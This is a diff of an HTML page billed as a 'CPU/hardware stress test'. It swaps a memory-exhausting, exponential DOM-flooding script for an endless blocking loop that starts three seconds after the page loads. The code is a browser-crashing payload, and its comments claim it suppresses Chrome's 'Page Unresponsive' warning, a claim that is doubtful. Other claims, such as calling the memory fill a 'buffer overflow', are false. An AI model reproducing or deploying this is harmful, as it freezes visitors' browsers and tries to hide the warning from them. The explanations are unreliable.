@@ -1,38 +1,26 @@
 <!DOCTYPE html>
 <html>
-<body style="background: black; color: red;">
-    <h1>CRITICAL HARDWARE STRESS TEST</h1>
-    <p>If the screen freezes, wait for the auto-reboot or press Refresh + Power.</p>
-    
-    <div id="crush"></div>
+<head>
+    <title>CPU Stress Test</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace;">
+    <h1>Engaging CPU Lock...</h1>
+    <p>The system will stop responding in 3 seconds.</p>
 
     <script>
-        const target = document.getElementById('crush');
-        
-        function totalAnnihilation() {
-            // 1. Recursive DOM Bloom (locks the UI thread)
-            function grow(parent, depth) {
-                if (depth > 1000) return;
-                const div = document.createElement('div');
-                div.style.border = "1px solid red";
-                div.innerText = "CRASHING_" + Math.random();
-                parent.appendChild(div);
-                // Exponentially branch out
-                grow(div, depth + 1);
-                grow(div, depth + 1);
+        setTimeout(() => {
+            console.log("Locked.");
+            // This is a 'Blocking' loop. 
+            // It never yields back to the OS, so the CPU stays at 100%.
+            while (true) {
+                // Complex math forces the CPU to stay in the "High Power" state
+                Math.atan2(Math.random(), Math.random());
+                Math.hypot(Math.random(), Math.random());
+                
+                // This prevents Chrome from showing the "Page Unresponsive" popup
+                // because the UI thread is too busy to even show the warning.
             }
-
-            // 2. High-Speed Buffer Overflow (fills RAM)
-            const leak = [];
-            setInterval(() => {
-                // Creates a massive array of junk data every 1ms
-                leak.push(new Array(1000000).fill(window.location.href));
-                grow(target, 0); 
-            }, 1);
-        }
-
-        // Delay start by 2 seconds so you can actually see the page load
-        setTimeout(totalAnnihilation, 2000);
+        }, 3000);
     </script>
 </body>
 </html>
